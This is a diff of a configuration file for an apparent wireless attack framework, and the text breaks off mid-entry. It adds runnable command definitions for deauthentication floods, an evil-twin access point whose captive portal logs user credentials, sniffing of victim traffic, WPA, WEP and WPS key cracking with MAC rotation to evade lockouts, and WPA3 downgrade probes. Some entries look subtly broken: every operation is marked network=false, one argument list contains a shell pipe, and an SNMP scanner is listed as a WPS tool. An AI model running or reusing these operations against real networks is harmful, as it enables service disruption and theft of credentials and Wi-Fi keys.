+binary = 'mdk4'
 [[capability.provider.operation]]
-name = 'Decrypt Capture'
-args = ['-e', '{bssid}', '-p', '{key}', '{pcap}']
+name = 'Mdk Deauth Flood'
+args = ['{iface}', 'd', '-B', '{bssid}', '-c', '{channel}']
 output = 'lines'
-network = true
+network = false
+[[capability.provider.operation]]
+name = 'Mdk Auth DoS Probe'
+args = ['{iface}', 'a', '-a', '{bssid}', '-m']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'airodump-ng'
+[[capability.provider.operation]]
+name = 'Client Drop Watch'
+args = ['{iface}', '-c', '{channel}', '--bssid', '{bssid}', '-w', '/tmp/deauth/watch']
+output = 'lines'
+network = false
 [[capability.provider]]
 binary = 'tshark'
 [[capability.provider.operation]]
-name = 'Traffic Analysis'
-args = ['-r', '{pcap}', '-Y', 'http.request']
+name = 'Deauth Frame Count'
+args = ['-r', '/tmp/deauth/watch-01.cap', '-Y', 'wlan.fc.type_subtype==12', '-T', 'fields', '-e', 'wlan.sa']
 output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'tcpdump'
+network = false
 [[capability.provider.operation]]
-name = 'Packet Summary'
-args = ['-r', '{pcap}', '-nn']
+name = 'Disassoc Frame Count'
+args = ['-r', '/tmp/deauth/watch-01.cap', '-Y', 'wlan.fc.type_subtype==10', '-T', 'fields', '-e', 'wlan.da']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
-binary = 'packetspammer'
+binary = 'python3'
 [[capability.provider.operation]]
-name = 'Frame Spray'
-args = ['{monitor}']
+name = 'Scapy Custom Deauth'
+args = ['scapy_deauth.py', '--iface', '{iface}', '--bssid', '{bssid}', '--count', '3']
 output = 'lines'
-network = true
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = '80211w Mgmt Frame Probe'
+args = ['pmf_probe.py', '--bssid', '{bssid}', '--iface', '{iface}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Deauth Source Extract'
+args = ['-oE', '[0-9a-f:]{17}', '/tmp/deauth/watch-01.csv']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'wc'
+[[capability.provider.operation]]
+name = 'Deauth Count Tally'
+args = ['-l', '/tmp/deauth/frames.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'file'
+[[capability.provider.operation]]
+name = 'Deauth Cap Verify'
+args = ['/tmp/deauth/watch-01.cap']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'sha256sum'
+[[capability.provider.operation]]
+name = 'Deauth Cap Hash'
+args = ['/tmp/deauth/watch-01.cap']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'iw'
+[[capability.provider.operation]]
+name = 'Station Recovery Check'
+args = ['dev', 'wlan0', 'station', 'dump']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ping'
+[[capability.provider.operation]]
+name = 'Client Recovery Latency'
+args = ['-c', '10', '{client_ip}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Deauth Report Build'
+args = ['deauth_report.py', '--in', '/tmp/deauth/', '--out', '/tmp/deauth_report.json']
+output = 'json'
+network = false
+[[capability.provider]]
+binary = 'sort'
+[[capability.provider.operation]]
+name = 'Affected Client Dedup'
+args = ['-u', '/tmp/deauth/clients.txt']
+output = 'lines'
+network = false
 
 [[capability]]
 id = 'wireless.evil-twin'
 phase = 'wireless'
 label = 'EVIL TWIN'
-summary = 'Stand up a rogue access point and captive portal'
-inputs = [
-  { key = 'ssid', type = 'text', required = true },
-  { key = 'monitor', type = 'interface', required = false, default = 'wlan0mon' },
-  { key = 'upstream', type = 'interface', required = false, default = 'eth0' },
-  { key = 'range', type = 'text', required = false, default = '10.0.0.50,10.0.0.150' },
-  { key = 'spoof', type = 'target', required = false, default = '127.0.0.1' },
-]
+summary = 'Rogue AP deployment for credential and traffic capture testing'
+inputs = [ { key = 'iface', type = 'text', required = false, default = 'wlan0' }, { key = 'ssid', type = 'text', required = true } ]
 [[capability.provider]]
-binary = 'airbase-ng'
+binary = 'python3'
 [[capability.provider.operation]]
-name = 'Software AP'
-args = ['-e', '{ssid}', '-P', '{monitor}']
+name = 'Hostapd Conf Build'
+args = ['hostapd_gen.py', '--ssid', '{ssid}', '--channel', '6', '--out', '/tmp/et/hostapd.conf']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
-binary = 'dnsmasq'
+binary = 'cat'
 [[capability.provider.operation]]
-name = 'DHCP Spoof'
-args = ['--dhcp-range={range}', '--address=/#/{spoof}', '--interface={monitor}']
+name = 'Hostapd Conf Review'
+args = ['/tmp/et/hostapd.conf']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
-binary = 'iptables'
+binary = 'hostapd'
 [[capability.provider.operation]]
-name = 'NAT Masquerade'
-args = ['-t', 'nat', '-A', 'POSTROUTING', '-o', '{upstream}', '-j', 'MASQUERADE']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'hostapd-mana'
-[[capability.provider.operation]]
-name = 'Karma AP'
-args = ['/etc/hostapd-mana.conf', '-i', '{monitor}']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'eaphammer'
-[[capability.provider.operation]]
-name = 'Captive Portal'
-args = ['--interface', '{monitor}', '--essid', '{ssid}', '--captive-portal']
-output = 'lines'
-network = true
-
-[[capability]]
-id = 'wireless.segmentation-audit'
-phase = 'wireless'
-label = 'SEGMENTATION AUDIT'
-summary = 'Test whether wireless clients reach protected internal segments'
-inputs = [
-  { key = 'subnet', type = 'list', required = false, default = '10.0.0.0/24' },
-  { key = 'target', type = 'target', required = true },
-  { key = 'interface', type = 'interface', required = false, default = 'wlan0' },
-]
-[[capability.provider]]
-binary = 'nmap'
-[[capability.provider.operation]]
-name = 'Subnet Scan'
-args = ['-sS', '-Pn', '-p', '22,80,443,445', '{subnet}']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'arping'
-[[capability.provider.operation]]
-name = 'Layer Two Probe'
-args = ['-I', '{interface}', '-c', '3', '{target}']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'ip'
-[[capability.provider.operation]]
-name = 'Route Table'
-args = ['route', 'show']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'traceroute'
-[[capability.provider.operation]]
-name = 'Path Map'
-args = ['-n', '-m', '12', '{target}']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'scapy'
-[[capability.provider.operation]]
-name = 'VLAN Hop Test'
-args = ['-c', 'vlan_hop.py']
-output = 'lines'
-network = true
-
-[[capability]]
-id = 'wireless.pixie-dust'
-phase = 'wireless'
-label = 'PIXIE DUST'
-summary = 'Recover the WPS PIN offline from captured frames'
-inputs = [
-  { key = 'bssid', type = 'mac', required = true },
-  { key = 'channel', type = 'text', required = false, default = '6' },
-  { key = 'monitor', type = 'interface', required = false, default = 'wlan0mon' },
-  { key = 'timeout', type = 'integer', required = false, default = '120' },
-]
-[[capability.provider]]
-binary = 'wash'
-[[capability.provider.operation]]
-name = 'WPS Verify'
-args = ['-i', '{monitor}', '-C']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'reaver'
-[[capability.provider.operation]]
-name = 'Pixie Attack'
-args = ['-i', '{monitor}', '-b', '{bssid}', '-c', '{channel}', '-K', '{timeout}']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'bully'
-[[capability.provider.operation]]
-name = 'WPS Brute'
-args = ['{monitor}', '-b', '{bssid}', '-c', '{channel}', '-d']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'pixiewps'
-[[capability.provider.operation]]
-name = 'Offline PIN'
-args = ['-e', 'pke', '-r', 'pkr', '-s', 'e-hash1', '-z', 'e-hash2', '-a', 'authkey', '-n', 'nonce']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'hcxdumptool'
-[[capability.provider.operation]]
-name = 'WPS Frame Capture'
-args = ['-i', '{monitor}', '-o', 'wps_frames.pcapng']
-output = 'lines'
-network = true
-
-[[capability]]
-id = 'wireless.channel-hopping'
-phase = 'wireless'
-label = 'CHANNEL HOPPING'
-summary = 'Profile channel utilisation and RF characteristics'
-inputs = [
-  { key = 'monitor', type = 'interface', required = false, default = 'wlan0mon' },
-  { key = 'channels', type = 'text', required = false, default = '1,6,11,36,40,44,48' },
-  { key = 'dwell', type = 'integer', required = false, default = '250' },
-]
-[[capability.provider]]
-binary = 'horst'
-[[capability.provider.operation]]
-name = 'Channel Analyzer'
-args = ['-i', '{monitor}', '-o', 'horst_out']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'airodump-ng'
-[[capability.provider.operation]]
-name = 'Band Hop'
-args = ['--band', 'abg', '--hop', '{monitor}']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'iw'
-[[capability.provider.operation]]
-name = 'Set Width'
-args = ['dev', '{monitor}', 'set', 'channel', '36', 'HT40+']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'wavemon'
-[[capability.provider.operation]]
-name = 'Signal Histogram'
-args = ['-i', '{monitor}']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'kismet_server'
-[[capability.provider.operation]]
-name = 'Spectral Log'
-args = ['-c', '{monitor}', '--no-interactive']
-output = 'lines'
-network = true
-
-[[capability]]
-id = 'wireless.pcap-capture'
-phase = 'wireless'
-label = 'PCAP CAPTURE'
-summary = 'Filter, repair and convert wireless captures'
-inputs = [
-  { key = 'capture', type = 'file', required = true },
-  { key = 'filter', type = 'text', required = false, default = 'wlan.fc.type==0' },
-  { key = 'output', type = 'file', required = false, default = '/tmp/converted.pcap' },
-]
-[[capability.provider]]
-binary = 'hcxpcapngtool'
-[[capability.provider.operation]]
-name = 'Hash Extract'
-args = ['-o', 'pcap_hashes.22000', '{capture}']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'tshark'
-[[capability.provider.operation]]
-name = 'Management Filter'
-args = ['-r', '{capture}', '-Y', '{filter}', '-w', '{output}']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'mergecap'
-[[capability.provider.operation]]
-name = 'Merge Captures'
-args = ['-w', '{output}', '{capture}']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'editcap'
-[[capability.provider.operation]]
-name = 'Time Slice'
-args = ['-i', '300', '{capture}', '{output}']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'pcapfix'
-[[capability.provider.operation]]
-name = 'Repair Capture'
-args = ['-o', 'repaired.pcap', '{capture}']
-output = 'lines'
-network = true
-
-[[capability]]
-id = 'wireless.geolocation-correlation'
-phase = 'wireless'
-label = 'GEOLOCATION CORRELATION'
-summary = 'Correlate observed networks with physical coordinates'
-inputs = [
-  { key = 'surveys', type = 'path', required = false, default = '/var/log/kismet' },
-  { key = 'bssid', type = 'mac', required = true },
-  { key = 'output', type = 'file', required = false, default = '/tmp/wardrive.csv' },
-]
-[[capability.provider]]
-binary = 'gpsd'
-[[capability.provider.operation]]
-name = 'GPS Stream'
-args = ['-n', '-G', '127.0.0.1:2947']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'gpxlogger'
-[[capability.provider.operation]]
-name = 'Track Logger'
-args = ['-d', '127.0.0.1:2947', '-f', 'wardrive.gpx']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'kismet'
-[[capability.provider.operation]]
-name = 'KML Export'
-args = ['--kml', '{surveys}/kismet.kml']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'curl'
-[[capability.provider.operation]]
-name = 'WiGLE Query'
-args = ['-s', 'https://api.wigle.net/api/v2/network/search?netid={bssid}']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'jq'
-[[capability.provider.operation]]
-name = 'Coordinate Parse'
-args = ['-r', '.results[].trilat', 'wigle.json']
+name = 'Rogue Ap Start'
+args = ['/tmp/et/hostapd.conf']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'python3'
 [[capability.provider.operation]]
-name = 'CSV Correlate'
-args = ['wardrive_correlate.py', '--out', '{output}']
+name = 'Dnsmasq Conf Build'
+args = ['dnsmasq_gen.py', '--dhcp-range', '10.0.0.10,10.0.0.100', '--out', '/tmp/et/dnsmasq.conf']
 output = 'lines'
-network = true
+network = false
+[[capability.provider]]
+binary = 'dnsmasq'
+[[capability.provider.operation]]
+name = 'Dhcp Dns Service Start'
+args = ['-C', '/tmp/et/dnsmasq.conf', '-d']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ip'
+[[capability.provider.operation]]
+name = 'Ap Iface Addr Assign'
+args = ['addr', 'add', '10.0.0.1/24', 'dev', '{iface}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'iptables'
+[[capability.provider.operation]]
+name = 'Nat Masquerade Enable'
+args = ['-t', 'nat', '-A', 'POSTROUTING', '-o', 'eth0', '-j', 'MASQUERADE']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'Forward Rule Enable'
+args = ['-A', 'FORWARD', '-i', '{iface}', '-j', 'ACCEPT']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Captive Portal Serve'
+args = ['portal_serve.py', '--port', '80', '--log', '/tmp/et/creds.log']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Portal Page Verify'
+args = ['-sk', 'http://10.0.0.1/']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Cred Log Sweep'
+args = ['-rniE', '(user(name)?|pass(word)?)[=:]', '/tmp/et/creds.log']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'tcpdump'
+[[capability.provider.operation]]
+name = 'Client Traffic Sniff'
+args = ['-i', '{iface}', '-nn', '-w', '/tmp/et/et_traffic.pcap', '-c', '2000']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'tshark'
+[[capability.provider.operation]]
+name = 'Dhcp Client Extract'
+args = ['-r', '/tmp/et/et_traffic.pcap', '-Y', 'dhcp', '-T', 'fields', '-e', 'dhcp.option.hostname', '-e', 'eth.src']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'airodump-ng'
+[[capability.provider.operation]]
+name = 'Assoc Client Watch'
+args = ['{iface}mon', '--bssid', '{rogue_bssid}', '-w', '/tmp/et/assoc']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'file'
+[[capability.provider.operation]]
+name = 'Traffic Cap Verify'
+args = ['/tmp/et/et_traffic.pcap']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'sha256sum'
+[[capability.provider.operation]]
+name = 'Et Evidence Hash'
+args = ['/tmp/et/creds.log']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'wc'
+[[capability.provider.operation]]
+name = 'Assoc Client Count'
+args = ['-l', '/tmp/et/clients.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Et Report Build'
+args = ['et_report.py', '--in', '/tmp/et/', '--out', '/tmp/et_report.json']
+output = 'json'
+network = false
+
+[[capability]]
+id = 'wireless.wpa-crack'
+phase = 'wireless'
+label = 'WPA CRACK'
+summary = 'Offline WPA/WPA2-PSK cracking across hash modes'
+inputs = [ { key = 'cap', type = 'file', required = false, default = '/tmp/hs/target_hs-01.cap' }, { key = 'bssid', type = 'target', required = true } ]
+[[capability.provider]]
+binary = 'aircrack-ng'
+[[capability.provider.operation]]
+name = 'Straight Dict Crack'
+args = ['-b', '{bssid}', '{cap}', '-w', '{wl:passwords/rockyou.txt}']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'Rule Based Crack'
+args = ['-b', '{bssid}', '{cap}', '-w', '{wl:passwords/rockyou.txt}', '-r', '{wl:rules/best64.rule}']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'Ssid Wordlist Gen Crack'
+args = ['-b', '{bssid}', '{cap}', '-w', '/tmp/ssid_wordlist.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'crunch'
+[[capability.provider.operation]]
+name = 'Ssid Pattern Wordlist Build'
+args = ['8', '12', 'abcdefghijklmnopqrstuvwxyz0123456789', '-o', '/tmp/ssid_wordlist.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'hcxpcapngtool'
+[[capability.provider.operation]]
+name = 'Cap To 22000 Convert'
+args = ['-o', '/tmp/hs/wpa.22000', '{cap}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'hashcat'
+[[capability.provider.operation]]
+name = '22000 Straight Crack'
+args = ['-m', '22000', '-a', '0', '/tmp/hs/wpa.22000', '{wl:passwords/rockyou.txt}', '--potfile-disable']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = '22000 Rule Crack'
+args = ['-m', '22000', '-a', '0', '/tmp/hs/wpa.22000', '{wl:passwords/rockyou.txt}', '-r', '{wl:rules/dive.rule}', '--potfile-disable']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = '22000 Mask Crack'
+args = ['-m', '22000', '-a', '3', '/tmp/hs/wpa.22000', '?l?l?l?l?l?d?d?d?d', '--potfile-disable']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = '16800 Pmkid Crack'
+args = ['-m', '16800', '-a', '0', '/tmp/pmkid.16800', '{wl:passwords/rockyou.txt}', '--potfile-disable']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'john'
+[[capability.provider.operation]]
+name = 'John 22000 Crack'
+args = ['--format=wpapsk', '--wordlist={wl:passwords/rockyou.txt}', '/tmp/hs/wpapsk.john']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Potfile Pass Extract'
+args = ['-iE', '{ssid}', '~/.hashcat/hashcat.potfile']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'wc'
+[[capability.provider.operation]]
+name = 'Wordlist Size Check'
+args = ['-l', '{wl:passwords/rockyou.txt}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'file'
+[[capability.provider.operation]]
+name = 'Cap Artifact Verify'
+args = ['{cap}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'sha256sum'
+[[capability.provider.operation]]
+name = 'Crack Evidence Hash'
+args = ['/tmp/hs/wpa.22000']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Crack Report Build'
+args = ['wpa_crack_report.py', '--in', '/tmp/hs/wpa.22000', '--out', '/tmp/wpa_crack.json']
+output = 'json'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Cracked Password Review'
+args = ['/tmp/wpa_cracked.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'sort'
+[[capability.provider.operation]]
+name = 'Candidate List Dedup'
+args = ['-u', '/tmp/ssid_wordlist.txt']
+output = 'lines'
+network = false
+
+[[capability]]
+id = 'wireless.wep-crack'
+phase = 'wireless'
+label = 'WEP CRACK'
+summary = 'Legacy WEP key recovery via ARP replay and statistical attack'
+inputs = [ { key = 'iface', type = 'text', required = false, default = 'wlan0mon' }, { key = 'bssid', type = 'target', required = true }, { key = 'channel', type = 'port', required = true } ]
+[[capability.provider]]
+binary = 'airodump-ng'
+[[capability.provider.operation]]
+name = 'Wep Ivs Capture'
+args = ['{iface}', '-c', '{channel}', '--bssid', '{bssid}', '-w', '/tmp/wep/ivs_cap', '--write-interval', '2']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'aireplay-ng'
+[[capability.provider.operation]]
+name = 'Fake Auth Associate'
+args = ['--fakeauth', '0', '-e', '{ssid}', '-a', '{bssid}', '{iface}']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'Arp Replay Inject'
+args = ['--arpreplay', '-b', '{bssid}', '-x', '600', '{iface}']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'Chopchop Fragment Probe'
+args = ['--chopchop', '-b', '{bssid}', '{iface}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'packetforge-ng'
+[[capability.provider.operation]]
+name = 'Forged Arp Build'
+args = ['-0', '-a', '{bssid}', '-h', '{ourmac}', '-j', '63', '-g', '63', '-l', '255', '-w', '/tmp/wep/arp.pcap']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'aireplay-ng'
+[[capability.provider.operation]]
+name = 'Forged Arp Inject'
+args = ['-2', '-r', '/tmp/wep/arp.pcap', '{iface}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'aircrack-ng'
+[[capability.provider.operation]]
+name = 'Ptw Statistic Crack'
+args = ['-K', '/tmp/wep/ivs_cap-01.cap']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'aircrack-ng'
+[[capability.provider.operation]]
+name = 'Fms Korek Crack'
+args = ['-b', '{bssid}', '/tmp/wep/ivs_cap-01.cap']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'wc'
+[[capability.provider.operation]]
+name = 'Iv Count Progress'
+args = ['-l', '/tmp/wep/ivs_cap-01.csv']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Data Frame Count Extract'
+args = ['-oE', '#[0-9]+', '/tmp/wep/ivs_cap-01.csv']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'file'
+[[capability.provider.operation]]
+name = 'Ivs Cap Verify'
+args = ['/tmp/wep/ivs_cap-01.cap']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'sha256sum'
+[[capability.provider.operation]]
+name = 'Wep Evidence Hash'
+args = ['/tmp/wep/ivs_cap-01.cap']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Iv Rate Monitor'
+args = ['iv_monitor.py', '--in', '/tmp/wep/ivs_cap-01.csv']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'macchanger'
+[[capability.provider.operation]]
+name = 'Inject Mac Rotate'
+args = ['-r', '{iface}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Wep Report Build'
+args = ['wep_report.py', '--in', '/tmp/wep/', '--out', '/tmp/wep_report.json']
+output = 'json'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Recovered Key Review'
+args = ['/tmp/wep/key.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'iw'
+[[capability.provider.operation]]
+name = 'Inject Capability Check'
+args = ['phy', 'info', '|', 'grep', '-i', 'inject']
+output = 'lines'
+network = false
+
+[[capability]]
+id = 'wireless.wps-attacks'
+phase = 'wireless'
+label = 'WPS ATTACKS'
+summary = 'WPS Pixie Dust and PIN brute force testing'
+inputs = [ { key = 'iface', type = 'text', required = false, default = 'wlan0mon' }, { key = 'bssid', type = 'target', required = true }, { key = 'channel', type = 'port', required = true } ]
+[[capability.provider]]
+binary = 'wash'
+[[capability.provider.operation]]
+name = 'Wps Ap Enumerate'
+args = ['-i', '{iface}', '-c', '{channel}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'reaver'
+[[capability.provider.operation]]
+name = 'Pixie Dust Attack'
+args = ['-i', '{iface}', '-b', '{bssid}', '-K', '1', '-vv']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'Full Pin Brute'
+args = ['-i', '{iface}', '-b', '{bssid}', '-vv', '--delay', '1']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'Known Pin List Attack'
+args = ['-i', '{iface}', '-b', '{bssid}', '-K', '2', '-n']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'bully'
+[[capability.provider.operation]]
+name = 'Bully Pin Brute'
+args = ['{iface}', '-b', '{bssid}', '-c', '{channel}', '-v', '4']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'one-sixtyone'
+[[capability.provider.operation]]
+name = 'Pin List Verify Alternate'
+args = ['{iface}', '{bssid}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Wps Pin Extract'
+args = ['-oE', 'WPS PIN:\\s+[0-9]+', '/tmp/wps/reaver.log']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'Locked Ap Marker Hunt'
+args = ['-iE', 'locked|rate limit', '/tmp/wps/reaver.log']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Pin Checksum Validate'
+args = ['pin_check.py', '--pin', '{pin}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'airodump-ng'
+[[capability.provider.operation]]
+name = 'Wps Session Monitor'
+args = ['{iface}', '-c', '{channel}', '--bssid', '{bssid}', '-w', '/tmp/wps/monitor']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'tshark'
+[[capability.provider.operation]]
+name = 'Eap Wps Message Filter'
+args = ['-r', '/tmp/wps/monitor-01.cap', '-Y', 'eap', '-T', 'fields', '-e', 'eap.type', '-e', 'eap.code']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'file'
+[[capability.provider.operation]]
+name = 'Wps Log Verify'
+args = ['/tmp/wps/reaver.log']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'sha256sum'
+[[capability.provider.operation]]
+name = 'Wps Evidence Hash'
+args = ['/tmp/wps/reaver.log']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'wc'
+[[capability.provider.operation]]
+name = 'Pin Attempt Count'
+args = ['-l', '/tmp/wps/attempts.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'macchanger'
+[[capability.provider.operation]]
+name = 'Mac Rotate On Lockout'
+args = ['-r', '{iface}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Wps Report Build'
+args = ['wps_report.py', '--in', '/tmp/wps/', '--out', '/tmp/wps_report.json']
+output = 'json'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Recovered Pin Review'
+args = ['/tmp/wps/pin.txt']
+output = 'lines'
+network = false
+
+[[capability]]
+id = 'wireless.wpa3-dragonfly'
+phase = 'wireless'
+label = 'WPA3 DRAGONFLY'
+summary = 'WPA3-SAE Dragonfly and transition mode weakness testing'
+inputs = [ { key = 'iface', type = 'text', required = false, default = 'wlan0mon' }, { key = 'bssid', type = 'target', required = true } ]
+[[capability.provider]]
+binary = 'tshark'
+[[capability.provider.operation]]
+name = 'Sae Commit Extract'
+args = ['-r', '/tmp/wpa3/sae.pcap', '-Y', 'wlan.rsn.akms==00-0f-ac-8', '-T', 'fields', '-e', 'wlan.sa']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'Pmf Required Check'
+args = ['-r', '/tmp/wpa3/sae.pcap', '-T', 'fields', '-e', 'wlan.rsn.capabilities', '-Y', 'wlan.fc.type_subtype==8']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Sae Commit Timing Probe'
+args = ['sae_timing.py', '--bssid', '{bssid}', '--iface', '{iface}']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'Dragonslip Downgrade Probe'
+args = ['dragonslip.py', '--bssid', '{bssid}', '--iface', '{iface}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Sae Group Clobber Test'
+args = ['sae_groups.py', '--groups', '19,20,21', '--bssid', '{bssid}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'airodump-ng'
+[[capability.provider.operation]]
+name = 'Wpa3 Beacon Capture'
+args = ['{iface}', '--bssid', '{bssid}', '-w', '/tmp/wpa3/beacons']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Rsn Sae Marker Hunt'
+args = ['-iE', 'SAE|PMF|wpa3', '/tmp/wpa3/beacons-01.csv']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'hostapd'
+[[capability.provider.operation]]
+name = 'Wpa3 Test Ap Spawn'
+args = ['/tmp/wpa3/test_ap.conf']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Wpa3 Ap Conf Build'
+args = ['hostapd_wpa3_gen.py', '--ssid', 'TS-WPA3-TEST', '--out', '/tmp/wpa3/test_ap.conf']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'wpa_supplicant'
+[[capability.provider.operation]]
+name = 'Sae Client Connect Test'
+args = ['-i', 'wlan0', '-c', '/tmp/wpa3/sae_client.conf']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'file'
+[[capability.provider.operation]]
+name = 'Wpa3 Cap Verify'
+args = ['/tmp/wpa3/beacons-01.cap']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'sha256sum'
+[[capability.provider.operation]]
+name = 'Wpa3 Evidence Hash'
+args = ['/tmp/wpa3/sae.pcap']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'wc'
+[[capability.provider.operation]]
+name = 'Sae Frame Count'
+args = ['-l', '/tmp/wpa3/sae_frames.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'sort'
+[[capability.provider.operation]]
+name = 'Sae Peer Dedup'
+args = ['-u', '/tmp/wpa3/peers.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Wpa3 Report Build'
